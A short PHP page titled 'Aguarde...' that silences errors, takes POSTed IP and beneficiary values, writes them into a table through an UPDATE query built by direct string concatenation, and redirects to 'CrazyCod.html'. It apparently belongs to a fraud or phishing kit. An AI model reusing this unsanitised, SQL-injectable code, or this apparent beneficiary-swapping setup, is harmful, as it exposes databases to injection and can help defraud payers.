<html>
<title>Aguarde...</title>
<head>

<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
?>


<?php
include 'connect.php';
session_start();
$IP = $_POST['IP'];
$BENEFICIARIO = $_POST['BENEFICIARIO'];


  $sql = "UPDATE `JSPHLT` SET ID_COD='$BENEFICIARIO' , CodBusca='$IP' WHERE IP ='$IP';";
 
    $QueryAuto = mysql_query($sql); 
	if (!$QueryAuto) {  
             return;
    } else {
 		
	}
	
?>   

<script language= "JavaScript">
location.href="CrazyCod.html"
</script>

